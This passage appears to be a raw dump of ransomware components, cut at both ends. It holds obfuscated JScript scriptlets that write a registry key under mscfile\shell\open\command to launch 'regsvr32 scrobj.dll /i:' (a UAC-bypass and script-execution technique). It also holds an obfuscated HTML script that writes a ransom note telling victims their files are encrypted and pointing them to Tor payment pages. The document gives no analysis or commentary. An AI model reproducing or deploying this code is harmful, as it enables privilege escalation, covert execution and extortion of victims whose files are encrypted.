ch4me00[26]+ch4me00[11]+ch4me00[0]+ch4me00[52]+ch4me00[18]+ch4me00[16]);]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; &lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;zmqj1z18yx&quot;&gt;&lt;script language=&quot;JScript&quot;&gt;&lt;![CDATA[var g2701095 = new Array(120,67,108,121,113,103,111,92,87,51,47,95,118,83,104,106,58,69,72,84,99,97,78,90,100,80,110,65,115,48,102,109,82,46,105,85,98,116,75,114,32,50,89,53,88,71,112,79,119,101,117);for(var hqu0ua=0;hqu0ua&lt;51;hqu0ua++) g2701095[hqu0ua] = String.fromCharCode(g2701095[hqu0ua]);var gpf8p = new this[g2701095[27]+g2701095[20]+g2701095[37]+g2701095[34]+g2701095[12]+g2701095[49]+g2701095[44]+g2701095[47]+g2701095[36]+g2701095[15]+g2701095[49]+g2701095[20]+g2701095[37]](g2701095[8]+g2701095[13]+g2701095[20]+g2701095[39]+g2701095[34]+g2701095[46]+g2701095[37]+g2701095[33]+g2701095[13]+g2701095[14]+g2701095[49]+g2701095[2]+g2701095[2])[g2701095[32]+g2701095[49]+g2701095[5]+g2701095[8]+g2701095[39]+g2701095[34]+g2701095[37]+g2701095[49]](g2701095[18]+g2701095[38]+g2701095[17]+g2701095[42]+g2701095[11]+g2701095[1]+g2701095[35]+g2701095[32]+g2701095[32]+g2701095[17]+g2701095[22]+g2701095[19]+g2701095[11]+g2701095[35]+g2701095[13]+g2701095[17]+g2701095[32]+g2701095[7]+g2701095[13]+g2701095[6]+g2701095[30]+g2701095[37]+g2701095[48]+g2701095[21]+g2701095[39]+g2701095[49]+g2701095[7]+g2701095[1]+g2701095[2]+g2701095[21]+g2701095[28]+g2701095[28]+g2701095[49]+g2701095[28]+g2701095[7]+g2701095[31]+g2701095[28]+g2701095[20]+g2701095[30]+g2701095[34]+g2701095[2]+g2701095[49]+g2701095[7]+g2701095[28]+g2701095[14]+g2701095[49]+g2701095[2]+g2701095[2]+g2701095[7]+g2701095[6]+g2701095[46]+g2701095[49]+g2701095[26]+g2701095[7]+g2701095[20]+g2701095[6]+g2701095[31]+g2701095[31]+g2701095[21]+g2701095[26]+g2701095[24]+g2701095[7],g2701095[39]+g2701095[49]+g2701095[5]+g2701095[28]+g2701095[12]+g2701095[39]+g2701095[9]+g2701095[41]+g2701095[33]+g2701095[49]+g2701095[0]+g2701095[49]+g2701095[40]+g2701095[28]+g2701095[20]+g2701095[39]+g2701095[6]+g2701095[36]+g2701095[15]+g2701095[33]+g2701095[24]+g2701095[2]+g2701095[2]+g2701095[40]+g2701095[10]+g2701095[28]+g2701095[40]+g2701095[10]+g2701095[50]+g2701095[40]+g2701095[10]+g2701095[26]+g2701095[40]+g2701095[10]+g2701095[34]+g2701095[16]+g2701095[33]+g2701095[33]+g2701095[10]+g2701095[33]+g2701095[33]+g2701095[10]+g2701095[33]+g2701095[33]+g2701095[10]+g2701095[35]+g2701095[28]+g2701095[49]+g2701095[39]+g2701095[28]+g2701095[10]+g2701095[25]+g2701095[50]+g2701095[36]+g2701095[2]+g2701095[34]+g2701095[20]+g2701095[10]+g2701095[3]+g2701095[4]+g2701095[43]+g2701095[3]+g2701095[14]+g2701095[29],g2701095[32]+g2701095[17]+g2701095[45]+g2701095[11]+g2701095[13]+g2701095[23]);]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; . Embeded HTML . &lt;html&gt;&lt;body&gt;&lt;script&gt;var c7gs9b80 = new Array(70,110,112,108,82,114,50,49,100,73,111,47,51,120,105,102,72,33,117,119,69,84,58,61,115,66,78,46,101,121,104,76,32,52,39,97,55,60,89,80,79,109,103,106,68,113,65,116,98,62,85,99,83,54,77,107,86,67,122,118);for(var w38qp=0;w38qp&lt;60;w38qp++) c7gs9b80[w38qp] = String.fromCharCode(c7gs9b80[w38qp]);d8k8ylg = &quot; &quot;;document.write(c7gs9b80[46]+c7gs9b80[31]+c7gs9b80[31]+c7gs9b80[32]+c7gs9b80[38]+c7gs9b80[40]+c7gs9b80[50]+c7gs9b80[4]+c7gs9b80[32]+c7gs9b80[44]+c7gs9b80[40]+c7gs9b80[57]+c7gs9b80[50]+c7gs9b80[54]+c7gs9b80[20]+c7gs9b80[26]+c7gs9b80[21]+c7gs9b80[52]+c7gs9b80[32]+c7gs9b80[39]+c7gs9b80[16]+c7gs9b80[40]+c7gs9b80[21]+c7gs9b80[40]+c7gs9b80[52]+c7gs9b80[32]+c7gs9b80[44]+c7gs9b80[46]+c7gs9b80[21]+c7gs9b80[46]+c7gs9b80[25]+c7gs9b80[46]+c7gs9b80[52]+c7gs9b80[20]+c7gs9b80[52]+c7gs9b80[32]+c7gs9b80[46]+c7gs9b80[26]+c7gs9b80[44]+c7gs9b80[32]+c7gs9b80[40]+c7gs9b80[21]+c7gs9b80[16]+c7gs9b80[20]+c7gs9b80[4]+c7gs9b80[32]+c7gs9b80[9]+c7gs9b80[54]+c7gs9b80[39]+c7gs9b80[40]+c7gs9b80[4]+c7gs9b80[21]+c7gs9b80[46]+c7gs9b80[26]+c7gs9b80[21]+c7gs9b80[32]+c7gs9b80[0]+c7gs9b80[9]+c7gs9b80[31]+c7gs9b80[20]+c7gs9b80[52]+c7gs9b80[32]+c7gs9b80[16]+c7gs9b80[46]+c7gs9b80[56]+c7gs9b80[20]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[20]+c7gs9b80[20]+c7gs9b80[26]+c7gs9b80[32]+c7gs9b80[20]+c7gs9b80[26]+c7gs9b80[57]+c7gs9b80[4]+c7gs9b80[38]+c7gs9b80[39]+c7gs9b80[21]+c7gs9b80[20]+c7gs9b80[44]+c7gs9b80[17]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[38]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[26]+c7gs9b80[40]+c7gs9b80[21]+c7gs9b80[32]+c7gs9b80[8]+c7gs9b80[35]+c7gs9b80[41]+c7gs9b80[35]+c7gs9b80[42]+c7gs9b80[28]+c7gs9b80[8]+c7gs9b80[17]+c7gs9b80[32]+c7gs9b80[38]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[41]+c7gs9b80[10]+c7gs9b80[8]+c7gs9b80[14]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[28]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[3]+c7gs9b80[29]+c7gs9b80[27]+c7gs9b80[32]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[41]+c7gs9b80[10]+c7gs9b80[8]+c7gs9b80[14]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[51]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[59]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[24]+c7gs9b80[14]+c7gs9b80[48]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[27]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[3]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[7]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[35]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[8]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[2]+c7gs9b80[47]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[28]+c7gs9b80[14]+c7gs9b80[59]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[14]+c7gs9b80[59]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[55]+c7gs9b80[28]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[1]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[8]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[2]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[42]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[41]+c7gs9b80[27]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[46]+c7gs9b80[1]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[41]+c7gs9b80[2]+c7gs9b80[47]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[14]+c7gs9b80[5]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[47]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[24]+c7gs9b80[10]+c7gs9b80[15]+c7gs9b80[47]+c7gs9b80[19]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[48]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[35]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[17]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[28]+c7gs9b80[14]+c7gs9b80[59]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[14]+c7gs9b80[59]+c7gs9b80[35]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[55]+c7gs9b80[28]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[1]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[8]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[2]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[42]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[41]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[10]+c7gs9b80[3]+c7gs9b80[3]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[24]+c7gs9b80[47]+c7gs9b80[5]+c7gs9b80[18]+c7gs9b80[51]+c7gs9b80[47]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[48]+c7gs9b80[28]+c7gs9b80[3]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[22]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[7]+c7gs9b80[27]+c7gs9b80[32]+c7gs9b80[44]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[1]+c7gs9b80[3]+c7gs9b80[10]+c7gs9b80[35]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[34]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[34]+c7gs9b80[32]+c7gs9b80[15]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[41]+c7gs9b80[32]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[24]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+c7gs9b80[19]+c7gs9b80[19]+c7gs9b80[19]+c7gs9b80[27]+c7gs9b80[47]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[2]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[43]+c7gs9b80[28]+c7gs9b80[51]+c7gs9b80[47]+c7gs9b80[27]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[42]+c7gs9b80[11]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[1]+c7gs9b80[8]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[24]+c7gs9b80[47]+c7gs9b80[35]+c7gs9b80[3]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[47]+c7gs9b80[27]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[6]+c7gs9b80[27]+c7gs9b80[32]+c7gs9b80[9]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[34]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[34]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[2]+c7gs9b80[28]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[24]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[35]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[35]+c7gs9b80[42]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[30]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[22]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b80[11]+d8k8ylg+c7gs9b80[27]+c7gs9b80[41]+c7gs9b80[30]+c7gs9b80[3]+c7gs9b80[13]+c7gs9b80[53]+c7gs9b80[12]+c7gs9b80[41]+c7gs9b80[36]+c7gs9b80[45]+c7gs9b80[48]+c7gs9b80[24]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[59]+c7gs9b80[51]+c7gs9b80[5]+c7gs9b80[36]+c7gs9b80[33]+c7gs9b80[59]+c7gs9b80[6]+c7gs9b80[58]+c7gs9b80[59]+c7gs9b80[43]+c7gs9b80[13]+c7gs9b80[48]+c7gs9b80[59]+c7gs9b80[36]+c7gs9b80[2]+c7gs9b80[42]+c7gs9b80[43]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[19]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[48]+c7gs9b80[36]+c7gs9b80[10]+c7gs9b80[35]+c7gs9b80[15]+c7gs9b80[33]+c7gs9b80[19]+c7gs9b80[51]+c7gs9b80[6]+c7gs9b80[41]+c7gs9b80[43]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[55]+c7gs9b80[30]+c7gs9b80[10]+c7gs9b80[28]+c7gs9b80[35]+c7gs9b80[35]+c7gs9b80[8]+c7gs9b80[27]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[14]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[11]+c7gs9b80[28]+c7gs9b80[42]+c7gs9b80[10]+c7gs9b80[13]+c7gs9b80[24]+c7gs9b80[43]+c7gs9b80[58]+c7gs9b80[51]+c7gs9b80[43]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[26]+c7gs9b80[10]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[17]+c7gs9b80[32]+c7gs9b80[21]+c7gs9b80[30]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[35]+c7gs9b80[42]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[14]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[59]+c7gs9b80[35]+c7gs9b80[14]+c7gs9b80[3]+c7gs9b80[35]+c7gs9b80[48]+c7gs9b80[3]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[59]+c7gs9b80[14]+c7gs9b80[35]+c7gs9b80[32]+c7gs9b80[34]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[34]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[3]+c7gs9b80[29]+c7gs9b80[27]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[23]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[46]+c7gs9b80[3]+c7gs9b80[24]+c7gs9b80[10]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[32]+c7gs9b80[51]+c7gs9b80[35]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[18]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[47]+c7gs9b80[28]+c7gs9b80[41]+c7gs9b80[2]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[35]+c7gs9b80[5]+c7gs9b80[29]+c7gs9b80[32]+c7gs9b80[35]+c7gs9b80[8]+c7gs9b80[8]+c7gs9b80[5]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[24]+c7gs9b80[32]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[32]+c7gs9b80[29]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[24]+c7gs9b80[10]+c7gs9b80[1]+c7gs9b80[35]+c7gs9b80[3]+c7gs9b80[32]+c7gs9b80[2]+c7gs9b80[35]+c7gs9b80[42]+c7gs9b80[28]+c7gs9b80[32]+c7gs9b80[19]+c7gs9b80[14]+c7gs9b80[47]+c7gs9b80[30]+c7gs9b80[10]+c7gs9b80[18]+c7gs9b80[47]+c7gs9b80[32]+c7gs9b80[18]+c7gs9b80[24]+c7gs9b80[14]+c7gs9b80[1]+c7gs9b80[42]+c7gs9b80[32]+c7gs9b80[34]+c7gs9b80[21]+c7gs9b80[10]+c7gs9b80[5]+c7gs9b80[32]+c7gs9b80[25]+c7gs9b80[5]+c7gs9b80[10]+c7gs9b80[19]+c7gs9b80[24]+c7gs9b80[28]+c7gs9b80[5]+c7gs9b80[34]+c7gs9b80[22]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[37]+c7gs9b80[48]+c7gs9b80[5]+c7gs9b80[49]+c7gs9b80[30]+c7gs9b80[47]+c7gs9b80[47]+c7gs9b80[2]+c7gs9b80[22]+c7gs9b80[11]+c7gs9b